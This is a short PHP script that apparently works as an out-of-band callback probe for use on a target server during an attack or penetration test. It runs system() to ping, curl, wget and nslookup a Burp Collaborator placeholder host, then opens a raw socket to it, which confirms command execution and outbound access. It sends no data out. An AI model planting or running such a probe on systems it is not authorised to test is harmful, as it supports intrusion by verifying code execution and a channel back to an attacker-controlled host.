<?php
$collab = "YOUR-COLLABORATOR.burpcollaborator.net";

// Method 1: Ping (Linux/Unix)
echo "Testing ping...\n";
system("ping -c 1 " . $collab . " 2>&1");

// Method 2: Curl HTTP request (more reliable)
echo "\n\nTesting HTTP request...\n";
system("curl http://" . $collab . " 2>&1");

// Method 3: wget
echo "\n\nTesting wget...\n";
system("wget http://" . $collab . " 2>&1");

// Method 4: DNS lookup (often works even if outbound HTTP is blocked)
echo "\n\nTesting DNS...\n";
system("nslookup " . $collab . " 2>&1");

// Method 5: Simple socket connection
echo "\n\nTesting socket...\n";
$fp = fsockopen($collab, 80, $errno, $errstr, 2);
if($fp) {
    fwrite($fp, "GET / HTTP/1.1\r\nHost: " . $collab . "\r\n\r\n");
    fclose($fp);
    echo "Socket connection successful!\n";
}
?>
